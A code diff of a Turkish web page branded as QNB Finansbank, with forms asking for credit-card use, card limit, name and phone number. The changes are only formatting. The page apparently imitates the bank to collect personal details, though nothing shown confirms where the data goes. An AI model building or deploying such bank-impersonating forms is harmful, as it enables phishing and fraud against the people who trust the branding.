@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="tr">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
   <title>QNB Başvuru</title>
   <style>
     body {
@@ -10,7 +10,6 @@
       margin: 0;
       padding: 0;
     }
-
     .header {
       background: linear-gradient(to right, #0d0c34, #56003c);
       padding: 5px 20px;
@@ -19,12 +18,10 @@
       height: 50px;
       box-sizing: border-box;
     }
-
     .header img {
       height: 40px;
       cursor: pointer;
     }
-
     .container {
       max-width: 400px;
       margin: 40px auto;
@@ -33,13 +30,11 @@
       border: 1px solid #eee;
       box-shadow: 0 0 10px rgba(0, 0, 0, 0.05);
     }
-
     label {
       font-weight: bold;
       display: block;
       margin-top: 20px;
     }
-
     input[type="text"],
     input[type="number"],
     input[type="tel"] {
@@ -49,17 +44,14 @@
       border-radius: 4px;
       font-size: 16px;
     }
-
     .choice-buttons {
       display: flex;
       justify-content: space-between;
       margin-top: 10px;
     }
-
     .choice-buttons input[type="radio"] {
       display: none;
     }
-
     .choice-buttons label {
       flex: 1;
       text-align: center;
@@ -73,13 +65,11 @@
       user-select: none;
       transition: background-color 0.3s, color 0.3s;
     }
-
     .choice-buttons input[type="radio"]:checked + label {
       background-color: #880e4f;
       color: white;
       border-color: #880e4f;
     }
-
     .login-button {
       width: 100%;
       margin-top: 25px;
@@ -93,21 +83,17 @@
       cursor: pointer;
       transition: background-color 0.3s;
     }
-
     .login-button:hover {
       background-color: #6a0040;
     }
-
     .error {
       color: red;
       margin-top: 10px;
       text-align: center;
     }
-
     .hidden {
       display: none;
     }
-
     .info, .success-box {
       background-color: #f8f8f8;
       padding: 10px;
@@ -115,22 +101,18 @@
       margin-top: 10px;
       font-size: 14px;
     }
-
     .success-container {
       text-align: center;
       padding: 40px 20px;
     }
-
     .success-container h2 {
       color: #4CAF50;
       margin-bottom: 10px;
     }
-
     .success-container p {
       font-size: 16px;
       margin: 8px 0;
     }
-
     .checkmark {
       font-size: 60px;
       color: #4CAF50;
@@ -140,7 +122,7 @@
 <body>
 
   <div class="header">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e1/QNB_Finansbank_logo.svg/512px-QNB_Finansbank_logo.svg.png" alt="QNB Logo">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e1/QNB_Finansbank_logo.svg/512px-QNB_Finansbank_logo.svg.png" alt="QNB Logo" />
   </div>
 
   <!-- FORM 1 -->
@@ -148,15 +130,15 @@
     <form id="loginForm">
       <label>Kredi kartı kullanıyor musunuz?</label>
       <div class="choice-buttons">
-        <input type="radio" id="evet" name="krediKart" value="Evet">
+        <input type="radio" id="evet" name="krediKart" value="Evet" />
         <label for="evet">Evet</label>
 
-        <input type="radio" id="hayir" name="krediKart" value="Hayır">
+        <input type="radio" id="hayir" name="krediKart" value="Hayır" />
         <label for="hayir">Hayır</label>
       </div>
 
       <label for="limit">Kart limitiniz</label>
-      <input type="number" id="limit" name="limit" placeholder="Örn: 10000 TL">
+      <input type="number" id="limit" name="limit" placeholder="Örn: 10000 TL" />
 
       <button type="submit" class="login-button">İleri</button>
       <div id="error" class="error"></div>
@@ -169,10 +151,10 @@
 
     <form id="secondForm">
       <label for="isim">İsim Soyisim</label>
-      <input type="text" id="isim" name="isim" placeholder="Adınız Soyadınız">
+      <input type="text" id="isim" name="isim" placeholder="Adınız Soyadınız" />
 
       <label for="tel">Telefon Numaranız</label>
-      <input type="tel" id="tel" name="tel" placeholder="05xxxxxxxxx">
+      <input type="tel" id="tel" name="tel" placeholder="05xxxxxxxxx" />
 
       <button type="submit" class="login-button">Gönder</button>
       <div id="error2" class="error"></div>
